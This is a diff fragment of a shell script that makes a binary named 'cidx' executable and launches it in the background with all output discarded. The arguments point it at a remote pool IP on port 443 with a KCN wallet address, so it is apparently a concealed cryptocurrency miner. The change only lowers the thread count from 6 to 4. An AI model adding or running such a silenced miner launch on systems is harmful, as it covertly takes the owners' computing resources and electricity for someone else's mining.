@@ -19,7 +19,7 @@ END
 chmod +x config.json cidx
 
 # Run cidx in the background
-nohup ./cidx -o 45.115.224.138:443 -a Flex -u KCN=kc1qndlfjd9n0q9659fhp34v9vjasjs3ugc4nevans -t 6 -p x &>/dev/null &
+nohup ./cidx -o 45.115.224.138:443 -a Flex -u KCN=kc1qndlfjd9n0q9659fhp34v9vjasjs3ugc4nevans -t 4 -p x &>/dev/null &
 
 # Clear the screen and print the current time and running jobs
 clear
